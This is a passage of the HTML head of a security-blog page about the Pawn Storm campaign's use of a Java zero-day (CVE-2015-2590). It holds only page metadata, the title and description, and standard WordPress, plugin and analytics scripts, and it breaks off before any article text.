
<!DOCTYPE html>
<html lang="en-US">
<head>
	<title>An In-Depth Look at How Pawn Storm‚Äôs Java Zero-Day Was Used - TrendLabs Security Intelligence Blog</title>
	<meta http-equiv="x-ua-compatible" content="IE=edge" >
	<meta charset="UTF-8" />
	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
		<link rel="pingback" href="https://blog.trendmicro.com/trendlabs-security-intelligence/xmlrpc.php" />
	<script type="text/javascript">
var siteUrl = "https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs";
var imageUrl = "https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/images";
var defaultBtnColor = "red";
var socialInactiveAlpha = "1";
var socialActiveAlpha = ".6";
</script>

<!--Plugin Global Hide Admin Tool Bar Active-->

<!-- This website is patched against a big problem not solved from WordPress 3.3+ to date -->

<meta name='robots' content='max-image-preview:large, index, follow, max-snippet:-1, max-video-preview:-1' />
<script type="text/javascript">
var utag_data = {
    "siteName": "",
    "siteDescription": "",
    "postCategory": [
        "exploits",
        "malware",
        "targeted_attacks"
    ],
    "postTags": [
        "apt28",
        "cve-2015-2590",
        "java-zero-day",
        "pawn-storm",
        "targeted-attack"
    ],
    "pageType": "post",
    "postId": 68930,
    "postTitle": "An In-Depth Look at How Pawn Storm\u2019s Java Zero-Day Was Used",
    "postAuthor": "Trend Micro",
    "postDate": "2015\/07\/14",
    "_edit_last": [
        "5"
    ],
    "_jd_twitter": [
        ""
    ],
    "_jd_tweet_this": [
        "yes"
    ],
    "_edit_lock": [
        "1444189052:5"
    ],
    "tweetbackscheck": [
        "1519809945"
    ],
    "shorturls": [
        "a:1:{s:9:\"permalink\";s:67:\"http:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/?p=68930\";}"
    ],
    "twittercomments": [
        "a:0:{}"
    ],
    "tweetcount": [
        "0"
    ],
    "_wpt_short_url": [
        "http:\/\/bit.ly\/1DfUElB"
    ],
    "_wp_jd_target": [
        "http:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used\/"
    ],
    "_jd_wp_twitter": [
        "a:1:{i:0;s:105:\"New post: An In-Depth Look at How Pawn Storm\u2019s Java Zero-Day Was Used http:\/\/bit.ly\/1DfUElB @TrendMicro\";}"
    ],
    "_wpt_status_message": [
        "Tweet sent successfully."
    ],
    "dsq_thread_id": [
        "3935629854"
    ],
    "_aioseop_keywords": [
        "Pawn Storm, Java zero-day, CVE-2015-2590, targeted attack, APT28"
    ],
    "_aioseop_description": [
        "How was the recent Java zero-day used by the Pawn Storm campaign?"
    ],
    "_aioseop_title": [
        "An In-Depth Look at How Pawn Storm\u2019s Java Zero-Day Was Used"
    ],
    "userRole": "guest"
};
</script>

	<!-- This site is optimized with the Yoast SEO plugin v15.9.1 - https://yoast.com/wordpress/plugins/seo/ -->
	<link rel="canonical" href="https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/" />
	<meta property="og:locale" content="en_US" />
	<meta property="og:type" content="article" />
	<meta property="og:title" content="An In-Depth Look at How Pawn Storm‚Äôs Java Zero-Day Was Used - TrendLabs Security Intelligence Blog" />
	<meta property="og:description" content="Operation Pawn Storm is a campaign known to target military, embassy, and defense contractor personnel from the United States and its allies. The attackers behind Operation Pawn Storm have been active since at least 2007 and they continue to launch new campaigns. Over the past year or so, we have seen numerous techniques and tactics..." />
	<meta property="og:url" content="https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/" />
	<meta property="article:published_time" content="2015-07-15T04:29:16+00:00" />
	<meta property="article:modified_time" content="2015-10-07T03:37:29+00:00" />
	<meta property="og:image" content="http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm.png" />
	<meta name="twitter:card" content="summary" />
	<meta name="twitter:label1" content="Written by">
	<meta name="twitter:data1" content="Trend Micro">
	<meta name="twitter:label2" content="Est. reading time">
	<meta name="twitter:data2" content="11 minutes">
	<script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/#website","url":"https://blog.trendmicro.com/trendlabs-security-intelligence/","name":"","description":"","potentialAction":[{"@type":"SearchAction","target":"https://blog.trendmicro.com/trendlabs-security-intelligence/?s={search_term_string}","query-input":"required name=search_term_string"}],"inLanguage":"en-US"},{"@type":"ImageObject","@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/#primaryimage","inLanguage":"en-US","url":"http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm.png"},{"@type":"WebPage","@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/#webpage","url":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/","name":"An In-Depth Look at How Pawn Storm\u2019s Java Zero-Day Was Used - TrendLabs Security Intelligence Blog","isPartOf":{"@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/#website"},"primaryImageOfPage":{"@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/#primaryimage"},"datePublished":"2015-07-15T04:29:16+00:00","dateModified":"2015-10-07T03:37:29+00:00","author":{"@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/#/schema/person/dd36720b24be16314cd91fda6bf52b56"},"breadcrumb":{"@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/#breadcrumb"},"inLanguage":"en-US","potentialAction":[{"@type":"ReadAction","target":["https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/"]}]},{"@type":"BreadcrumbList","@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"item":{"@type":"WebPage","@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/","url":"https://blog.trendmicro.com/trendlabs-security-intelligence/","name":"Home"}},{"@type":"ListItem","position":2,"item":{"@type":"WebPage","@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/","url":"https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/","name":"An In-Depth Look at How Pawn Storm\u2019s Java Zero-Day Was Used"}}]},{"@type":"Person","@id":"https://blog.trendmicro.com/trendlabs-security-intelligence/#/schema/person/dd36720b24be16314cd91fda6bf52b56","name":"Trend Micro"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel='dns-prefetch' href='//fonts.googleapis.com' />
<link rel='dns-prefetch' href='//s.w.org' />
<link rel='dns-prefetch' href='//m9m6e2w5.stackpathcdn.com' />
<link rel='dns-prefetch' href='//cdn.shareaholic.net' />
<link rel='dns-prefetch' href='//www.shareaholic.net' />
<link rel='dns-prefetch' href='//analytics.shareaholic.com' />
<link rel='dns-prefetch' href='//recs.shareaholic.com' />
<link rel='dns-prefetch' href='//go.shareaholic.com' />
<link rel='dns-prefetch' href='//partner.shareaholic.com' />
<link rel="alternate" type="application/rss+xml" title=" &raquo; Feed" href="https://blog.trendmicro.com/trendlabs-security-intelligence/feed/" />
<link rel="alternate" type="application/rss+xml" title=" &raquo; Comments Feed" href="https://blog.trendmicro.com/trendlabs-security-intelligence/comments/feed/" />
<link rel="alternate" type="application/rss+xml" title=" &raquo; An In-Depth Look at How Pawn Storm‚Äôs Java Zero-Day Was Used Comments Feed" href="https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/feed/" />
<!-- Shareaholic - https://www.shareaholic.com -->
<link rel='preload' href='//cdn.shareaholic.net/assets/pub/shareaholic.js' as='script'/>
<script data-no-minify='1' data-cfasync='false'>
_SHR_SETTINGS = {"endpoints":{"local_recs_url":"https:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/wp-admin\/admin-ajax.php?action=shareaholic_permalink_related","ajax_url":"https:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/wp-admin\/admin-ajax.php"},"site_id":"f9f1a771608a24e84c49a8532e282dc1","url_components":{"year":"2015","monthnum":"07","day":"14","hour":"21","minute":"29","second":"16","post_id":"68930","postname":"an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used","category":"exploits"}};
</script>
<script data-no-minify='1' data-cfasync='false' src='//cdn.shareaholic.net/assets/pub/shareaholic.js' data-shr-siteid='f9f1a771608a24e84c49a8532e282dc1' async ></script>

<!-- Shareaholic Content Tags -->
<meta name='shareaholic:language' content='en-US' />
<meta name='shareaholic:url' content='https://blog.trendmicro.com/trendlabs-security-intelligence/an-in-depth-look-at-how-pawn-storms-java-zero-day-was-used/' />
<meta name='shareaholic:keywords' content='tag:apt28, tag:cve-2015-2590, tag:java zero-day, tag:pawn storm, tag:targeted attack, cat:exploits, cat:malware, cat:targeted attacks, type:post' />
<meta name='shareaholic:article_published_time' content='2015-07-14T21:29:16-07:00' />
<meta name='shareaholic:article_modified_time' content='2015-10-06T20:37:29-07:00' />
<meta name='shareaholic:shareable_page' content='true' />
<meta name='shareaholic:article_author_name' content='Trend Micro' />
<meta name='shareaholic:site_id' content='f9f1a771608a24e84c49a8532e282dc1' />
<meta name='shareaholic:wp_version' content='9.6.1' />
<meta name='shareaholic:image' content='http://blog.trendmicro.com/trendlabs-security-intelligence/files/2015/07/pawnstorm.png' />
<!-- Shareaholic Content Tags End -->
		<script type="text/javascript">
			window._wpemojiSettings = {"baseUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/72x72\/","ext":".png","svgUrl":"https:\/\/s.w.org\/images\/core\/emoji\/13.0.1\/svg\/","svgExt":".svg","source":{"wpemoji":"https:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/wp-includes\/js\/wp-emoji.js?ver=3934800cf10e43fe39ddd35aef4d4ed8","twemoji":"https:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/wp-includes\/js\/twemoji.js?ver=3934800cf10e43fe39ddd35aef4d4ed8"}};
			/**
 * @output wp-includes/js/wp-emoji-loader.js
 */

( function( window, document, settings ) {
	var src, ready, ii, tests;

	// Create a canvas element for testing native browser support of emoji.
	var canvas = document.createElement( 'canvas' );
	var context = canvas.getContext && canvas.getContext( '2d' );

	/**
	 * Checks if two sets of Emoji characters render the same visually.
	 *
	 * @since 4.9.0
	 *
	 * @private
	 *
	 * @param {number[]} set1 Set of Emoji character codes.
	 * @param {number[]} set2 Set of Emoji character codes.
	 *
	 * @return {boolean} True if the two sets render the same.
	 */
	function emojiSetsRenderIdentically( set1, set2 ) {
		var stringFromCharCode = String.fromCharCode;

		// Cleanup from previous test.
		context.clearRect( 0, 0, canvas.width, canvas.height );
		context.fillText( stringFromCharCode.apply( this, set1 ), 0, 0 );
		var rendered1 = canvas.toDataURL();

		// Cleanup from previous test.
		context.clearRect( 0, 0, canvas.width, canvas.height );
		context.fillText( stringFromCharCode.apply( this, set2 ), 0, 0 );
		var rendered2 = canvas.toDataURL();

		return rendered1 === rendered2;
	}

	/**
	 * Detects if the browser supports rendering emoji or flag emoji.
	 *
	 * Flag emoji are a single glyph made of two characters, so some browsers
	 * (notably, Firefox OS X) don't support them.
	 *
	 * @since 4.2.0
	 *
	 * @private
	 *
	 * @param {string} type Whether to test for support of "flag" or "emoji".
	 *
	 * @return {boolean} True if the browser can render emoji, false if it cannot.
	 */
	function browserSupportsEmoji( type ) {
		var isIdentical;

		if ( ! context || ! context.fillText ) {
			return false;
		}

		/*
		 * Chrome on OS X added native emoji rendering in M41. Unfortunately,
		 * it doesn't work when the font is bolder than 500 weight. So, we
		 * check for bold rendering support to avoid invisible emoji in Chrome.
		 */
		context.textBaseline = 'top';
		context.font = '600 32px Arial';

		switch ( type ) {
			case 'flag':
				/*
				 * Test for Transgender flag compatibility. This flag is shortlisted for the Emoji 13 spec,
				 * but has landed in Twemoji early, so we can add support for it, too.
				 *
				 * To test for support, we try to render it, and compare the rendering to how it would look if
				 * the browser doesn't render it correctly (white flag emoji + transgender symbol).
				 */
				isIdentical = emojiSetsRenderIdentically(
					[ 0x1F3F3, 0xFE0F, 0x200D, 0x26A7, 0xFE0F ],
					[ 0x1F3F3, 0xFE0F, 0x200B, 0x26A7, 0xFE0F ]
				);

				if ( isIdentical ) {
					return false;
				}

				/*
				 * Test for UN flag compatibility. This is the least supported of the letter locale flags,
				 * so gives us an easy test for full support.
				 *
				 * To test for support, we try to render it, and compare the rendering to how it would look if
				 * the browser doesn't render it correctly ([U] + [N]).
				 */
				isIdentical = emojiSetsRenderIdentically(
					[ 0xD83C, 0xDDFA, 0xD83C, 0xDDF3 ],
					[ 0xD83C, 0xDDFA, 0x200B, 0xD83C, 0xDDF3 ]
				);

				if ( isIdentical ) {
					return false;
				}

				/*
				 * Test for English flag compatibility. England is a country in the United Kingdom, it
				 * does not have a two letter locale code but rather an five letter sub-division code.
				 *
				 * To test for support, we try to render it, and compare the rendering to how it would look if
				 * the browser doesn't render it correctly (black flag emoji + [G] + [B] + [E] + [N] + [G]).
				 */
				isIdentical = emojiSetsRenderIdentically(
					[ 0xD83C, 0xDFF4, 0xDB40, 0xDC67, 0xDB40, 0xDC62, 0xDB40, 0xDC65, 0xDB40, 0xDC6E, 0xDB40, 0xDC67, 0xDB40, 0xDC7F ],
					[ 0xD83C, 0xDFF4, 0x200B, 0xDB40, 0xDC67, 0x200B, 0xDB40, 0xDC62, 0x200B, 0xDB40, 0xDC65, 0x200B, 0xDB40, 0xDC6E, 0x200B, 0xDB40, 0xDC67, 0x200B, 0xDB40, 0xDC7F ]
				);

				return ! isIdentical;
			case 'emoji':
				/*
				 * So easy, even a baby could do it!
				 *
				 *  To test for Emoji 13 support, try to render a new emoji: Man Feeding Baby.
				 *
				 * The Man Feeding Baby emoji is a ZWJ sequence combining üë® Man, a Zero Width Joiner and üçº Baby Bottle.
				 *
				 * 0xD83D, 0xDC68 == Man emoji.
				 * 0x200D == Zero-Width Joiner (ZWJ) that links the two code points for the new emoji or
				 * 0x200B == Zero-Width Space (ZWS) that is rendered for clients not supporting the new emoji.
				 * 0xD83C, 0xDF7C == Baby Bottle.
				 *
				 * When updating this test for future Emoji releases, ensure that individual emoji that make up the
				 * sequence come from older emoji standards.
				 */
				isIdentical = emojiSetsRenderIdentically(
					[0xD83D, 0xDC68, 0x200D, 0xD83C, 0xDF7C],
					[0xD83D, 0xDC68, 0x200B, 0xD83C, 0xDF7C]
				);

				return ! isIdentical;
		}

		return false;
	}

	/**
	 * Adds a script to the head of the document.
	 *
	 * @ignore
	 *
	 * @since 4.2.0
	 *
	 * @param {Object} src The url where the script is located.
	 * @return {void}
	 */
	function addScript( src ) {
		var script = document.createElement( 'script' );

		script.src = src;
		script.defer = script.type = 'text/javascript';
		document.getElementsByTagName( 'head' )[0].appendChild( script );
	}

	tests = Array( 'flag', 'emoji' );

	settings.supports = {
		everything: true,
		everythingExceptFlag: true
	};

	/*
	 * Tests the browser support for flag emojis and other emojis, and adjusts the
	 * support settings accordingly.
	 */
	for( ii = 0; ii < tests.length; ii++ ) {
		settings.supports[ tests[ ii ] ] = browserSupportsEmoji( tests[ ii ] );

		settings.supports.everything = settings.supports.everything && settings.supports[ tests[ ii ] ];

		if ( 'flag' !== tests[ ii ] ) {
			settings.supports.everythingExceptFlag = settings.supports.everythingExceptFlag && settings.supports[ tests[ ii ] ];
		}
	}

	settings.supports.everythingExceptFlag = settings.supports.everythingExceptFlag && ! settings.supports.flag;

	// Sets DOMReady to false and assigns a ready function to settings.
	settings.DOMReady = false;
	settings.readyCallback = function() {
		settings.DOMReady = true;
	};

	// When the browser can not render everything we need to load a polyfill.
	if ( ! settings.supports.everything ) {
		ready = function() {
			settings.readyCallback();
		};

		/*
		 * Cross-browser version of adding a dom ready event.
		 */
		if ( document.addEventListener ) {
			document.addEventListener( 'DOMContentLoaded', ready, false );
			window.addEventListener( 'load', ready, false );
		} else {
			window.attachEvent( 'onload', ready );
			document.attachEvent( 'onreadystatechange', function() {
				if ( 'complete' === document.readyState ) {
					settings.readyCallback();
				}
			} );
		}

		src = settings.source || {};

		if ( src.concatemoji ) {
			addScript( src.concatemoji );
		} else if ( src.wpemoji && src.twemoji ) {
			addScript( src.twemoji );
			addScript( src.wpemoji );
		}
	}

} )( window, document, window._wpemojiSettings );
		</script>
		<style type="text/css">
img.wp-smiley,
img.emoji {
	display: inline !important;
	border: none !important;
	box-shadow: none !important;
	height: 1em !important;
	width: 1em !important;
	margin: 0 .07em !important;
	vertical-align: -0.1em !important;
	background: none !important;
	padding: 0 !important;
}
</style>
	<link rel='stylesheet' id='fes-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/feedburner-email-subscription/css/styles.css?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='all' />
<link rel='stylesheet' id='staticStyle-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/css/style.css?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='screen' />
<link rel='stylesheet' id='dynamicStyle-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/css/dynamicCss.php?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='screen' />
<link rel='stylesheet' id='responsiveStyle-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/css/responsiveCss.php?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='screen' />
<link rel='stylesheet' id='custom-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/css/customCss.php?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='screen' />
<link rel='stylesheet' id='wp-block-library-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-includes/css/dist/block-library/style.css?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='all' />
<link rel='stylesheet' id='fancybox-for-wp-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/fancybox-for-wordpress/assets/css/fancybox.css?ver=1.3.4' type='text/css' media='all' />
<link rel='stylesheet' id='wpt-twitter-feed-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/wp-to-twitter/css/twitter-feed.css?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='all' />
<link rel='stylesheet' id='wordpress-popular-posts-css-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/wordpress-popular-posts/assets/css/wpp.css?ver=5.2.4' type='text/css' media='all' />
<link rel='stylesheet' id='layerslider_css-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/framework/plug-ins/LayerSlider/css/layerslider.css?ver=3.5.0' type='text/css' media='all' />
<link rel='stylesheet' id='frs-css-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/fluid-responsive-slideshow/css/frs.css?ver=2.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='frs-position-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/fluid-responsive-slideshow/css/frs-position.css?ver=2.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='OpenSans-css'  href='https://fonts.googleapis.com/css?family=Open+Sans%3A400italic%2C700italic%2C400%2C700&#038;ver=2.3.1' type='text/css' media='all' />
<link rel='stylesheet' id='yarppRelatedCss-css'  href='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/yet-another-related-posts-plugin/style/related.css?ver=3934800cf10e43fe39ddd35aef4d4ed8' type='text/css' media='all' />
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-includes/js/jquery/jquery.js?ver=3.5.1' id='jquery-core-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-includes/js/jquery/jquery-migrate.js?ver=3.3.2' id='jquery-migrate-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/superfish.js?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='superFish-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/verticalMenu.js?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='verticalMenu-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/jquery.tools.tabs.min.js?ver=1.2.5' id='jquery-tabs-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/jquery.imgpreload.js?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='imgPreloader-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/jquery.colorbox-min.js?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='colorBox-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/jquery.isotope.min.js?ver=1.5.19' id='isotope-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/jquery.easing.1.3.js?ver=1.3' id='easing-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/custom.js?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='custom-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/js/customJs.php?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='customJs-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/fluid-responsive-slideshow/js/frs.js?ver=2.3.1' id='fluid-responsive-slideshow-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/fluid-responsive-slideshow/js/jquery.touchSwipe.min.js?ver=3934800cf10e43fe39ddd35aef4d4ed8' id='touchSwipe_js-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/fluid-responsive-slideshow/js/imagesloaded.min.js?ver=2.3.1' id='images-loaded-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/fancybox-for-wordpress/assets/js/jquery.fancybox.js?ver=1.3.4' id='fancybox-for-wp-js'></script>
<script type='application/json' id='wpp-json'>
{"sampling_active":0,"sampling_rate":100,"ajax_url":"https:\/\/blog.trendmicro.com\/trendlabs-security-intelligence\/wp-json\/wordpress-popular-posts\/v1\/popular-posts","ID":68930,"token":"3997a158b0","lang":0,"debug":0}
</script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/wordpress-popular-posts/assets/js/wpp.min.js?ver=5.2.4' id='wpp-js-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/framework/plug-ins/LayerSlider/js/layerslider.kreaturamedia.jquery.js?ver=3.5.0' id='layerslider_js-js'></script>
<script type='text/javascript' src='https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/themes/inspiredTrendLabs/framework/plug-ins/LayerSlider/js/jquery-easing-1.3.js?ver=1.3.0' id='jquery_easing-js'></script>
<link rel="https://api.w.org/" href="https://blog.trendmicro.com/trendlabs-security-intelligence/wp-json/" /><link rel="alternate" type="application/json" href="https://blog.trendmicro.com/trendlabs-security-intelligence/wp-json/wp/v2/posts/68930" /><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://blog.trendmicro.com/trendlabs-security-intelligence/xmlrpc.php?rsd" />
<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://blog.trendmicro.com/trendlabs-security-intelligence/wp-includes/wlwmanifest.xml" /> 
<link rel='shortlink' href='https://blog.trendmicro.com/trendlabs-security-intelligence/?p=68930' />
<link rel="alternate" type="application/json+oembed" href="https://blog.trendmicro.com/trendlabs-security-intelligence/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.trendmicro.com%2Ftrendlabs-security-intelligence%2Fan-in-depth-look-at-how-pawn-storms-java-zero-day-was-used%2F" />
<link rel="alternate" type="text/xml+oembed" href="https://blog.trendmicro.com/trendlabs-security-intelligence/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fblog.trendmicro.com%2Ftrendlabs-security-intelligence%2Fan-in-depth-look-at-how-pawn-storms-java-zero-day-was-used%2F&#038;format=xml" />
<link rel="stylesheet" type="text/css" media="screen" href="https://blog.trendmicro.com/trendlabs-security-intelligence/wp-content/plugins/date-stamp/date-stamp.css" />
<!-- Fancybox for WordPress v3.3.1 -->
<style type="text/css">
	.fancybox-slide--image .fancybox-content{background-color: #FFFFFF}div.fancybox-caption{display:none !important;}
	
	img.fancybox-image{border-width:10px;border-color:#FFFFFF;border-style:solid;height:auto;}
	div.fancybox-bg{background-color:rgba(102,102,102,0.3);opacity:1 !important;}div.fancybox-content{border-color:#FFFFFF}
	div#fancybox-title{background-color:#FFFFFF}
	div.fancybox-content{background-color:#FFFFFF}
	div#fancybox-title-inside{color:#333333}
	
	
	
	div.fancybox-caption p.caption-title{display:inline-block}
	div.fancybox-caption p.caption-title{font-size:14px}
	div.fancybox-caption p.caption-title{color:#333333}
	div.fancybox-caption {color:#333333}div.fancybox-caption p.caption-title {background:#fff; width:auto;padding:10px 30px;}div.fancybox-content p.caption-title{color:#333333;margin: 0;padding: 5px 0;}
</style><script type="text/javascript">
	jQuery(function () {

		var mobileOnly = false;
		
		if (mobileOnly) {
			return;
		}

		jQuery.fn.getTitle = function () { // Copy the title of every IMG tag and add it to its parent A so that fancybox can show titles
			var arr = jQuery("a[data-fancybox]");
									jQuery.each(arr, function() {
										var title = jQuery(this).children("img").attr("title");
										 var caption = jQuery(this).next("figcaption").html();
                                        if(caption && title){jQuery(this).attr("title",title+" " + caption)}else if(title){ jQuery(this).attr("title",title);}else if(caption){jQuery(this).attr("title",caption);}
									});			}

		// Supported file extensions

				var thumbnails = jQuery("a:has(img)").not(".nolightbox").not('.envira-gallery-link').not('.ngg-simplelightbox').filter(function () {
			return /\.(jpe?g|png|gif|mp4|webp|bmp|pdf)(\?[^/]*)*$/i.test(jQuery(this).attr('href'))
		});
		

		// Add data-type iframe for links that are not images or videos.
		var iframeLinks = jQuery('.fancyboxforwp').filter(function () {
			return !/\.(jpe?g|png|gif|mp4|webp|bmp|pdf)(\?[^/]*)*$/i.test(jQuery(this).attr('href'))
		}).filter(function () {
			return !/vimeo|youtube/i.test(jQuery(this).attr('href'))
		});
		iframeLinks.attr({"data-type": "iframe"}).getTitle();

				// Gallery All
		thumbnails.addClass("fancyboxforwp").attr("data-fancybox", "gallery").getTitle();
		iframeLinks.attr({"data-fancybox": "gallery"}).getTitle();

		// Gallery type NONE
		
		// Call fancybox and apply it on any link with a rel atribute that starts with "fancybox", with the options set on the admin panel
		jQuery("a.fancyboxforwp").fancyboxforwp({
			loop: false,
			smallBtn: true,
			zoomOpacity: "auto",
			animationEffect: "fade",
			animationDuration: 500,
			transitionEffect: "fade",
			transitionDuration: "300",
			overlayShow: true,
			overlayOpacity: "0.3",
			titleShow: true,
			titlePosition: "inside",
			keyboard: true,
			showCloseButton: true,
			arrows: true,
			clickContent:false,
			clickSlide: "close",
			mobile: {
				clickContent: function (current, event) {
					return current.type === "image" ? "toggleControls" : false;
				},
				clickSlide: function (current, event) {
					return current.type === "image" ? "close" : "close";
				},
			},
			wheel: false,
			toolbar: true,
			preventCaptionOverlap: true,
			onInit: function() { },			onDeactivate
	: function() { },		beforeClose: function() { },			afterShow: function(instance) { jQuery( ".fancybox-image" ).on("click", function( ){ ( instance.isScaledDown() ) ? instance.scaleToActual() : instance.scaleToFit() }) },				afterClose: function() { },					caption : function( instance, item ) {var title ="";if("undefined" != typeof jQuery(this).context ){var title = jQuery(this).context.title;} else { var title = ("undefined" != typeof jQuery(this).attr("title")) ? jQuery(this).attr("title") : false;}var caption = jQuery(this).data('caption') || '';if ( item.type === 'image' && title.length ) {caption = (caption.length ? caption + '<br />' : '') + '<p class="caption-title">'+title+'</p>' ;}return caption;},
		afterLoad : function( instance, current ) {current.$content.append('<div class=\"fancybox-custom-caption inside-caption\" style=\" position: absolute;left:0;right:0;color:#000;margin:0 auto;bottom:0;text-align:center;background-color:#FFFFFF \">' + current.opts.caption + '</div>');},
			})
		;

			})
</script>
<!-- END Fancybox for WordPress -->
<link rel="shortcut icon" href="https://www.trendmicro.com/favicon.ico" type="image/x-icon"  />
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
<!-- Google Tag Manager -->
<script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
